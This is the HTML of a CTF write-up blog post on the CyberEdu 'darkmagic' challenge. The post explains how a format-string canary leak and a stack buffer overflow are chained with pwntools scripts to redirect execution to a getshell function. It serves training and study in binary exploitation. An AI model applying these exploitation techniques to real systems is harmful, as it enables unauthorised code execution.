<!DOCTYPE html>
<html lang="en" dir="auto" data-theme="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CyberEdu darkmagic Writeup | Irina&#39;s CTF Writeups</title>
<meta name="keywords" content="CyberEdu, pwn, buffer-overflow, Format-String">
<meta name="description" content="Challenge overview
In a distant land a dark magical power lay. We need a hero to defeat these dark forces.

We&rsquo;re working with a 64-bit binary with NX and Canary enabled, and a format string vulnerability. Let&rsquo;s take a look at the binary.

This is the vuln function, along which we have a getshell function that we need to redirect to. We can deduct that v5 is our canary being checked.">
<meta name="author" content="">
<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/darkmagic-writeup/">
<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/darkmagic-writeup/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
                color-scheme: dark;
            }

            .list {
                background: var(--theme);
            }

            .toc {
                background: var(--entry);
            }
        }

        @media (prefers-color-scheme: light) {
            .list::-webkit-scrollbar-thumb {
                border-color: var(--code-bg);
            }
        }

    </style>
</noscript>
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.querySelector("html").dataset.theme = 'dark';
    } else if (localStorage.getItem("pref-theme") === "light") {
       document.querySelector("html").dataset.theme = 'light';
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.querySelector("html").dataset.theme = 'dark';
    } else {
        document.querySelector("html").dataset.theme = 'light';
    }

</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/darkmagic-writeup/">
  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
  <meta property="og:title" content="CyberEdu darkmagic Writeup">
  <meta property="og:description" content="Challenge overview In a distant land a dark magical power lay. We need a hero to defeat these dark forces.
We’re working with a 64-bit binary with NX and Canary enabled, and a format string vulnerability. Let’s take a look at the binary.
This is the vuln function, along which we have a getshell function that we need to redirect to. We can deduct that v5 is our canary being checked.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-12-27T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-12-27T00:00:00+00:00">
    <meta property="article:tag" content="CyberEdu">
    <meta property="article:tag" content="Pwn">
    <meta property="article:tag" content="Buffer-Overflow">
    <meta property="article:tag" content="Format-String">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CyberEdu darkmagic Writeup">
<meta name="twitter:description" content="Challenge overview
In a distant land a dark magical power lay. We need a hero to defeat these dark forces.

We&rsquo;re working with a 64-bit binary with NX and Canary enabled, and a format string vulnerability. Let&rsquo;s take a look at the binary.

This is the vuln function, along which we have a getshell function that we need to redirect to. We can deduct that v5 is our canary being checked.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://irinasusca.github.io/writeup-blog/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CyberEdu darkmagic Writeup",
      "item": "https://irinasusca.github.io/writeup-blog/posts/darkmagic-writeup/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CyberEdu darkmagic Writeup",
  "name": "CyberEdu darkmagic Writeup",
  "description": "Challenge overview In a distant land a dark magical power lay. We need a hero to defeat these dark forces.\nWe\u0026rsquo;re working with a 64-bit binary with NX and Canary enabled, and a format string vulnerability. Let\u0026rsquo;s take a look at the binary.\nThis is the vuln function, along which we have a getshell function that we need to redirect to. We can deduct that v5 is our canary being checked.\n",
  "keywords": [
    "CyberEdu", "pwn", "buffer-overflow", "Format-String"
  ],
  "articleBody": "Challenge overview In a distant land a dark magical power lay. We need a hero to defeat these dark forces.\nWe’re working with a 64-bit binary with NX and Canary enabled, and a format string vulnerability. Let’s take a look at the binary.\nThis is the vuln function, along which we have a getshell function that we need to redirect to. We can deduct that v5 is our canary being checked.\nIdentifying the vulnerabilities First of all, we can leak addresses with the format string vulnerability. Since we already have the getshell function and we aren’t dealing with PIE, we don’t need to figure out the binary base address or leak libc. Instead, we’re going to use it to leak the canary.\nThis for loop is very interesting:\nv3 = 1; for ( i = 0; i \u003c v3; ++i ) { read(0, buf, 512u); read(0, v4, 512u); printf(buf); printf(v4); if ( v3 \u003e 10 ) break; } Since v3 is on the stack between buf and v4, we can modify it accordingly to extend our loop, which normally executes once. The first time, we leak the canary, and the second time, we redirect to getshell.\nFirst, let’s see at what offset is our canary.\nLuckily, gef can automatically detect the canary for us, and we compare that to the values on the stack that we leaked. In this case, it was %57$p. So let’s cook the first payload, which will increase the v3 to something like 2 or 3.\nSomething weird I noticed is that we need to manually send another third enter after our payloads… But maybe it doesn’t mean anything.\nHere is confirmation we actually overwrite v3:\nThe exploit The weird manual third enter I was talking about started actually being a problem.\n#100 bytes buf payload1 = b'A'*100 #4 byte v3, turn v3 to 0x3 payload1 += p32(0x2) payload2=b'%57$p' p.recvuntil(b'!\\n') p.sendline(payload1) p.sendline(payload2) p.send(b'\\n') p.send(b'\\n') #p.recvuntil(b'\\x02\\n') #canary = int(p.recvline().strip(), 16) #print(hex(canary)) I had to comment out the canary receiving lines because we wouldn’t get anything back from the binary until we send another MANUAL enter for some reason, some unknown reason that made no sense at all. And the newlines I kept trying to send didn’t work whatsoever. Until I came up with this solution:\np.recvuntil(b'!\\n') p.sendline(payload1) p.sendline(payload2) p.sendline(b'\\n'*10) And by worked I mean it worked once, didn’t work five times after that, then worked again. So every time I wanted to run it I had to run it about five times before it would actually work.\np.recvuntil('A\\x02') canary = int(p.recvline().strip(), 16) print(hex(canary)) getshell = 0x400737 payload1 = b'a'*100 #pad to v3 payload1 += p32(0x1) #v3 i guess p.sendline(payload1) payload2=b'b'*112 payload2+=p64(canary) #rbp payload2+=b'b'*8 payload2+=p64(getshell) p.sendline(payload2) p.sendline(b'\\n'*5) p.interactive() I ended up with this script for the second part, and I just kept getting weirder and weirder errors.\nI was already annoyed to hell so I thought I’d check if the same error happens remotely. Guess what, it didn’t! Thanks local file! But we did need to recalculate the offset to the canary. This time it seemed to be at %35$p.\nTesting finally started working smoothly, but we would get EOF error once again..\nI thought, what if we try redirecting into main instead, as troubleshooting?\nIt worked! Would you look at that! So the problem was the getshell function… Or rather the usual suspect, alignment. So I used ropper to find a ret gadget:\ngetshell = 0x400737 main = 0x400850 ret=0x4005d6 payload1 = b'nothing important\\x00' payload1+=b'\\n' #v3 i guess p.send(payload1) payload2=b'b'*112 payload2+=p64(canary) #rbp payload2+=b'b'*8 payload2+=p64(ret) payload2+=p64(getshell) payload2+=b'\\n' #print(payload2) p.send(payload2) And - we get the flag!!\nAs always, the full code can be found on my GitHub here.\n",
  "wordCount" : "609",
  "inLanguage": "en",
  "datePublished": "2025-12-27T00:00:00Z",
  "dateModified": "2025-12-27T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://irinasusca.github.io/writeup-blog/posts/darkmagic-writeup/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Irina's CTF Writeups",
    "logo": {
      "@type": "ImageObject",
      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
    }
  }
}
</script>
</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      CyberEdu darkmagic Writeup
    </h1>
    <div class="post-meta"><span title='2025-12-27 00:00:00 +0000 UTC'>December 27, 2025</span>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
                <li>
                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a></li>
                <li>
                    <a href="#the-exploit" aria-label="The exploit">The exploit</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
<p>In a distant land a dark magical power lay. <strong><a href="https://app.cyber-edu.co/challenges/676b3ac0-347c-11eb-bc7f-b5898cb45fdc?tenant=cyberedu">We need a hero</a></strong> to defeat these dark forces.</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/darkmagic-writeup/pic1.png#center"></p>
<p>We&rsquo;re working with a 64-bit binary with NX and Canary enabled, and a format string vulnerability. Let&rsquo;s take a look at the binary.</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/darkmagic-writeup/pic2.png#center"></p>
<p>This is the <code>vuln</code> function, along which we have a <code>getshell</code> function that we need to redirect to. We can deduct that <code>v5</code> is our canary being checked.</p>
<hr>
<h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
<p>First of all, we can leak addresses with the format string vulnerability. Since we already have the <code>getshell</code> function and we aren&rsquo;t dealing with <code>PIE</code>, we don&rsquo;t need to figure out the binary base address or leak libc. Instead, we&rsquo;re going to use it to leak the canary.</p>
<p>This <code>for</code> loop is very interesting:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> v3; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    read(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">512</span>u);
</span></span><span style="display:flex;"><span>    read(<span style="color:#ae81ff">0</span>, v4, <span style="color:#ae81ff">512</span>u);
</span></span><span style="display:flex;"><span>    printf(buf);
</span></span><span style="display:flex;"><span>    printf(v4);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">10</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>Since <code>v3</code> is on the stack between <code>buf</code> and <code>v4</code>, we can modify it accordingly to extend our loop, which normally executes once. The first time, we leak the canary, and the second time, we redirect to <code>getshell</code>.</p>
<p>First, let&rsquo;s see at what offset is our canary.</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/darkmagic-writeup/pic3.png#center"></p>
<p>Luckily, <code>gef</code> can automatically detect the canary for us, and we compare that to the values on the stack that we leaked. In this case, it was <code>%57$p</code>. So let&rsquo;s cook the first payload, which will increase the <code>v3</code> to something like 2 or 3.</p>
<p>Something weird I noticed is that we need to manually send another third enter after our payloads&hellip; But maybe it doesn&rsquo;t mean anything.</p>
<p>Here is confirmation we actually overwrite <code>v3</code>:</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/darkmagic-writeup/pic4.png#center"></p>
<hr>
<h2 id="the-exploit">The exploit<a hidden class="anchor" aria-hidden="true" href="#the-exploit">#</a></h2>
<p>The weird manual third enter I was talking about started actually being a problem.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#100 bytes buf</span>
</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#4 byte v3, turn v3 to 0x3</span>
</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload2<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%57$p&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload1)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload2)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#p.recvuntil(b&#39;\x02\n&#39;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#canary = int(p.recvline().strip(), 16)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(hex(canary))</span>
</span></span></code></pre></div><p>I had to comment out the canary receiving lines because we wouldn&rsquo;t get anything back from the binary until we send another MANUAL enter for some reason, some unknown reason that made no sense at all. And the newlines I kept trying to send didn&rsquo;t work whatsoever. Until I came up with this solution:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload1)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload2)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>)
</span></span></code></pre></div><p>And by <em>worked</em> I mean it worked once, didn&rsquo;t work five times after that, then worked again. So every time I wanted to run it I had to run it about five times before it would actually work.</p>
<hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;A</span><span style="color:#ae81ff">\x02</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(), <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>print(hex(canary))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>getshell <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400737</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#pad to v3</span>
</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x1</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#v3 i guess </span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload2<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">112</span>
</span></span><span style="display:flex;"><span>payload2<span style="color:#f92672">+=</span>p64(canary)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#rbp</span>
</span></span><span style="display:flex;"><span>payload2<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>payload2<span style="color:#f92672">+=</span>p64(getshell)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload2)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>I ended up with this script for the second part, and I just kept getting weirder and weirder errors.</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/darkmagic-writeup/pic7.png#center"></p>
<p>I was already annoyed to hell so I thought I&rsquo;d check if the same error happens remotely. Guess what, it <em>didn&rsquo;t</em>! Thanks local file! But we did need to recalculate the offset to the canary. This time it seemed to be at <code>%35$p</code>.</p>
<p>Testing finally started working smoothly, but we would get <code>EOF</code> error once again..</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/darkmagic-writeup/pic8.png#center"></p>
<p>I thought, what if we try redirecting into <code>main</code> instead, as troubleshooting?</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/darkmagic-writeup/pic9.png#center"></p>
<p>It worked! Would you look at that! So the problem was the <code>getshell</code> function&hellip; Or rather the usual suspect, <em>alignment</em>. So I used <code>ropper</code> to find a <code>ret</code> gadget:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>getshell <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400737</span>
</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400850</span>
</span></span><span style="display:flex;"><span>ret<span style="color:#f92672">=</span><span style="color:#ae81ff">0x4005d6</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;nothing important</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload1<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#v3 i guess </span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload2<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">112</span>
</span></span><span style="display:flex;"><span>payload2<span style="color:#f92672">+=</span>p64(canary)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#rbp</span>
</span></span><span style="display:flex;"><span>payload2<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>payload2<span style="color:#f92672">+=</span>p64(ret)
</span></span><span style="display:flex;"><span>payload2<span style="color:#f92672">+=</span>p64(getshell)
</span></span><span style="display:flex;"><span>payload2<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(payload2)</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload2)
</span></span></code></pre></div><p>And - we get the flag!!</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/darkmagic-writeup/pic10.png#center"></p>
<hr>
<p>As always, the full code can be found on my GitHub
<strong><a href="https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/darkmagic.py">here</a></strong>.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/cyberedu/">CyberEdu</a></li>
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/buffer-overflow/">Buffer-Overflow</a></li>
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/format-string/">Format-String</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu');
    if (menu) {
        
        const scrollPosition = localStorage.getItem("menu-scroll-position");
        if (scrollPosition) {
            menu.scrollLeft = parseInt(scrollPosition, 10);
        }
        
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        const html = document.querySelector("html");
        if (html.dataset.theme === "dark") {
            html.dataset.theme = 'light';
            localStorage.setItem("pref-theme", 'light');
        } else {
            html.dataset.theme = 'dark';
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
